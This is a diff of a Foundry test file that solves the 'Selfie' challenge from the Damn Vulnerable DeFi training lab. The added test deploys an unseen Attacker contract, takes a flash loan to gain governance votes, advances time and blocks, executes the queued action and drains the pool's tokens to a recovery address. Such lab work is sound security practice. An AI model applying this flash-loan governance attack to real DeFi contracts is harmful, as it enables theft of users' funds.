@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "src/SimpleGovernance.sol";
 import {SelfiePool} from "src/SelfiePool.sol";
+import {Attacker} from "src/Attacker.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -61,7 +62,32 @@ contract SelfieChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_selfie() public checkSolvedByPlayer {}
+    function test_selfie() public checkSolvedByPlayer {
+        Attacker attacker = new Attacker(governance, pool, token); //create attacker contract
+        attacker.attack(); //call pool flashloan function
+        vm.warp(block.timestamp + 2 days); //warp time by 2 days
+        vm.roll(block.number + 3); //roll block by 3
+        attacker.executeAction(1); //execute action
+        attacker.withdraw(recovery); //send tokens to recovery address
+    }
+
+    // function test_attack() public {
+    //     Attacker attacker = new Attacker(governance, pool, token);
+    //     attacker.attack();
+    //     console.log("Attacker balance: %s", token.balanceOf(address(attacker)));
+    //     console.log("Pool balance: %s", token.balanceOf(address(pool)));
+    //     uint256 counter = governance.getActionCounter();
+    //     console.log("Action counter: %s", counter);
+    //     vm.warp(block.timestamp + 2 days);
+    //     vm.roll(block.number + 3);
+    //     attacker.executeAction(1);
+    //     console.log("Attacker balance: %s", token.balanceOf(address(attacker)));
+    //     console.log("Pool balance: %s", token.balanceOf(address(pool)));
+    //     attacker.withdraw(recovery);
+    //     console.log("Recovery balance: %s", token.balanceOf(recovery));
+    //     console.log("Attacker balance: %s", token.balanceOf(address(attacker)));
+    //     console.log("Pool balance: %s", token.balanceOf(address(pool)));
+    // }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
